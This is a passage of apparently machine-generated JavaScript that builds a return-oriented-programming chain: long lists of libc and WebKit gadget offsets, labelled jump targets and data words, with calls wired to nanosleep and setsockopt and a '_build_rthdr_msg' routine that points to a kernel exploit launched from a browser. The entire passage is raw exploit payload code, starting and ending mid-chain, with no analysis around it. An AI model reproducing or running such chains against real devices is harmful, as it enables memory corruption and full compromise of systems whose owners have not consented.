//L4081:
db([0,0]);
//L4044:
set_gadgets([
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+245616,//L4083
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+245632,//L4084
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+245600,//L4082
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4082:
db([0,0]);
set_gadget(libc_base+165442,);
//L4083:
db([0,0]);
set_gadget(libc_base+768796,);
//L4084:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+245760,//L4087
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+245792,//L4089
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+245776,//L4088
webkit_base+4687784,
libc_base+713278
]);
//L4086:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L4087:
db([0,0]);
set_gadget(libc_base+165442,);
//L4088:
db([0,0]);
set_gadget(libc_base+768796,);
//L4089:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+245904,//L4090+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+245896,//L4090
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L4090:
db([0,0]);
set_gadgets([
ropchain+245920,//L4090+24
ropchain+245936,//L4085
libc_base+489696,//pop rsp
ropchain+245952,//L4091
//L4085:
libc_base+489696,//pop rsp
ropchain+245968,//L4092
//L4091:
libc_base+489696,//pop rsp
ropchain+242992,//L4018
//L4092:
libc_base+713278,
ropchain+246048,//L4094
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+246032,//L4093
webkit_base+4687784,
libc_base+165442
]);
//L4093:
db([0,0]);
set_gadget(libc_base+768796,);
//L4094:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+246152,//L4095
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+246168,//L4096
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L4095:
db([0,0]);
set_gadget(libc_base+768796,);
//L4096:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+246288,//L4097
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+246272,//L4098
webkit_base+4687784,
libc_base+768796
]);
//L4098:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L4097:
db([0,0]);
//L3973:
set_gadget(libc_base+713278,);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+608613,//pop rdx
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+17972187,//pop r9
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+765305,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
webkit_base+4687784,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+489696,//pop rsp
libc_base+430587,
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967080,4294967295]);// -0xd8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([200,0]);// 0xc8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967088,4294967295]);// -0xd0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([192,0]);// 0xc0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967096,4294967295]);// -0xc8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([184,0]);// 0xb8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967104,4294967295]);// -0xc0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([176,0]);// 0xb0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967112,4294967295]);// -0xb8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([168,0]);// 0xa8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+772328
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
webkit_base+5236215,//and rax,rcx
libc_base+772328,
nanosleep_addr,
webkit_base+2989859,//mov [rax],rcx
libc_base+713278
]);
db([4294967192,4294967295]);// -0x68
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([48,0]);
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+430587,
libc_base+713278
]);
db([32,0]);// 0x20
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([128,0]);// 0x80
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+247616,//L4099
webkit_base+4687784,
libc_base+489696 //pop rsp
]);
//L4099:
db([0,0]);
//L3927:
set_gadget(libc_base+713278,);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+608613,//pop rdx
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+17972187,//pop r9
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+765305,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
webkit_base+4687784,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+489696,//pop rsp
libc_base+430587,
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967080,4294967295]);// -0xd8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([200,0]);// 0xc8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967088,4294967295]);// -0xd0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([192,0]);// 0xc0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967096,4294967295]);// -0xc8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([184,0]);// 0xb8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967104,4294967295]);// -0xc0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([176,0]);// 0xb0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967112,4294967295]);// -0xb8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([168,0]);// 0xa8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+772328
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
webkit_base+5236215,//and rax,rcx
libc_base+772328,
setsockopt_addr,
webkit_base+2989859,//mov [rax],rcx
libc_base+713278
]);
db([4294967192,4294967295]);// -0x68
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([48,0]);
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+430587,
libc_base+713278
]);
db([32,0]);// 0x20
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([128,0]);// 0x80
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+248944,//L4100
webkit_base+4687784,
libc_base+489696 //pop rsp
]);
//L4100:
db([0,0]);
//_build_rthdr_msg:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+249016,//L4102
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L4102:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+249080,//L4104
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L4104:
db([0,0]);
set_gadget(libc_base+713278,);
db([16,0]);// 0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4105:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L4107:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+249232,//L4109
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+249248,//L4110
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L4109:
db([0,0]);
set_gadget(libc_base+772328,);
//L4110:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+249408,//L4112
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+249440,//L4114
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+249392,//L4111
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+249424,//L4113
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4111:
db([0,0]);
set_gadget(libc_base+165442,);
//L4112:
db([0,0]);
set_gadget(libc_base+772328,);
//L4113:
db([0,0]);
set_gadget(libc_base+768796,);
//L4114:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+249536,//L4116
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+249520,//L4115
webkit_base+4687784,
libc_base+165442
]);
//L4115:
db([0,0]);
set_gadget(libc_base+768796,);
//L4116:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L4117:
db([8,0]);// 0x8
set_gadget(libc_base+772328,);
//L4118:
db([8,0]);// 0x8
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+249752,//L4120
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+249768,//L4121
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+249736,//L4119
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4119:
db([0,0]);
set_gadget(libc_base+165442,);
//L4120:
db([0,0]);
set_gadget(libc_base+768796,);
//L4121:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+249848,//L4122
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+249864,//L4123
webkit_base+4687784,
libc_base+165442
]);
//L4122:
db([0,0]);
set_gadget(libc_base+768796,);
//L4123:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+250056,//L4127
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+250008,//L4124
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+250024,//L4125
webkit_base+4687784,
libc_base+845410,//mov rax,rsi
libc_base+713278,
ropchain+250040,//L4126
webkit_base+4687784,
libc_base+713278
]);
//L4124:
db([0,0]);
set_gadget(libc_base+165442,);
//L4125:
db([0,0]);
set_gadget(libc_base+772328,);
//L4126:
db([0,0]);
set_gadget(libc_base+768796,);
//L4127:
db([0,0]);
set_gadgets([
libc_base+765459,//cqo ;idiv rsi
libc_base+713278,
ropchain+250200,//L4130
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+250168,//L4128
webkit_base+4687784,
libc_base+845410,//mov rax,rsi
libc_base+713278,
ropchain+250184,//L4129
webkit_base+4687784,
libc_base+713278
]);
//L4128:
db([0,0]);
set_gadget(libc_base+772328,);
//L4129:
db([0,0]);
set_gadget(libc_base+768796,);
//L4130:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L4131:
db([1,0]);// 0x1
set_gadget(libc_base+772328,);
//L4132:
db([1,0]);// 0x1
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
//L4133:
db([4294967295,4294967295]);// 0xffffffffffffffff
set_gadget(libc_base+768796,);
//L4134:
db([1,0]);// 0x1
set_gadgets([
libc_base+856504,//xor rax,rsi ;sub rax,rsi
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+250432,//L4136
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L4136:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+250488,//L4138
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L4138:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+5236215,//and rax,rcx
libc_base+713278,
ropchain+250584,//L4141
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4139:
db([4294967292,4294967295]);// -0x4
set_gadget(libc_base+772328,);
//L4141:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4142:
db([4294967292,4294967295]);// -0x4
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+250712,//L4145
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+250728,//L4146
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L4145:
db([0,0]);
set_gadget(libc_base+772328,);
//L4146:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+250888,//L4148
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+250920,//L4150
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+250872,//L4147
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+250904,//L4149
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4147:
db([0,0]);
set_gadget(libc_base+165442,);
//L4148:
db([0,0]);
set_gadget(libc_base+772328,);
//L4149:
db([0,0]);
set_gadget(libc_base+768796,);
//L4150:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+251016,//L4152
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+251000,//L4151
webkit_base+4687784,
libc_base+165442
]);
//L4151:
db([0,0]);
set_gadget(libc_base+768796,);
//L4152:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L4153:
db([1,0]);// 0x1
set_gadget(libc_base+772328,);
//L4154:
db([1,0]);// 0x1
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L4155:
db([8,0]);// 0x8
set_gadget(libc_base+772328,);
//L4156:
db([8,0]);// 0x8
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+251344,//L4158
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+251360,//L4159
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+251328,//L4157
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4157:
db([0,0]);
set_gadget(libc_base+165442,);
//L4158:
db([0,0]);
set_gadget(libc_base+768796,);
//L4159:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+251480,//L4163
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+251464,//L4162
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4160:
db([24,0]);// 0x18
set_gadget(libc_base+165442,);
//L4162:
db([0,0]);
set_gadget(libc_base+772328,);
//L4163:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4164:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L4166:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+251624,//L4168
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+251640,//L4169
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L4168:
db([0,0]);
set_gadget(libc_base+772328,);
//L4169:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+251760,//L4173
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+251744,//L4172
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4170:
db([4294967280,4294967295]);// -0x10
set_gadget(libc_base+165442,);
//L4172:
db([0,0]);
set_gadget(libc_base+772328,);
//L4173:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+2989859,//mov [rax],rcx
libc_base+713278,
ropchain+251896,//L4177
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+251864,//L4175
webkit_base+4687784,
libc_base+768796
]);
//L4174:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L4175:
db([0,0]);
set_gadget(libc_base+165442,);
//L4176:
db([0,0]);
set_gadget(libc_base+772328,);
//L4177:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+252056,//L4181
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+252008,//L4178
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+252024,//L4179
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4178:
db([0,0]);
set_gadget(libc_base+165442,);
//L4179:
db([0,0]);
set_gadget(libc_base+772328,);
//L4180:
db([56,0]);// 0x38
set_gadget(libc_base+768796,);
//L4181:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+252160,//L4183
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+252144,//L4182
webkit_base+4687784,
libc_base+772328
]);
//L4182:
db([0,0]);
set_gadget(libc_base+768796,);
//L4183:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+252256,//L4186
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4184:
db([4294967280,4294967295]);// -0x10
set_gadget(libc_base+772328,);
//L4186:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+252344,//L4188
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+252360,//L4189
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L4188:
db([0,0]);
set_gadget(libc_base+772328,);
//L4189:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+252464,//L4192
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+252448,//L4191
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L4191:
db([0,0]);
set_gadget(libc_base+772328,);
//L4192:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+252520,//L4194
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L4194:
db([0,0]);
set_gadgets([
webkit_base+887232,//mov [rax],cl
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+252624,//L4197
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4195:
db([4294967292,4294967295]);// -0x4
set_gadget(libc_base+772328,);
//L4197:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+252712,//L4199
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+252728,//L4200
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L4199:
db([0,0]);
set_gadget(libc_base+772328,);
//L4200:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+252888,//L4202
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+252920,//L4204
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+252872,//L4201
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+252904,//L4203
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4201:
db([0,0]);
set_gadget(libc_base+165442,);
//L4202:
db([0,0]);
set_gadget(libc_base+772328,);
//L4203:
db([0,0]);
set_gadget(libc_base+768796,);
//L4204:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+253000,//L4205
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+253016,//L4206
webkit_base+4687784,
libc_base+165442
]);
//L4205:
db([0,0]);
set_gadget(libc_base+768796,);
//L4206:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+253176,//L4210
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+253128,//L4207
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+253144,//L4208
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4207:
db([0,0]);
set_gadget(libc_base+165442,);
//L4208:
db([0,0]);
set_gadget(libc_base+772328,);
//L4209:
db([56,0]);// 0x38
set_gadget(libc_base+768796,);
//L4210:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+253280,//L4212
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+253264,//L4211
webkit_base+4687784,
libc_base+772328
]);
//L4211:
db([0,0]);
set_gadget(libc_base+768796,);
//L4212:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+253376,//L4215
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4213:
db([4294967280,4294967295]);// -0x10
set_gadget(libc_base+772328,);
//L4215:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+253464,//L4217
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+253480,//L4218
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L4217:
db([0,0]);
set_gadget(libc_base+772328,);
//L4218:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+253584,//L4221
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+253568,//L4220
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L4220:
db([0,0]);
set_gadget(libc_base+772328,);
//L4221:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+253656,//L4224
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
//L4222:
db([1,0]);// 0x1
set_gadget(libc_base+772328,);
//L4224:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+253768,//L4226
webkit_base+4687784,
libc_base+768796
]);
//L4225:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L4226:
db([0,0]);
set_gadget(libc_base+165442,);
//L4227:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+253944,//L4231
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+253896,//L4228
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+253912,//L4229
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4228:
db([0,0]);
set_gadget(libc_base+165442,);
//L4229:
db([0,0]);
set_gadget(libc_base+772328,);
//L4230:
db([56,0]);// 0x38
set_gadget(libc_base+768796,);
//L4231:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+254048,//L4233
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
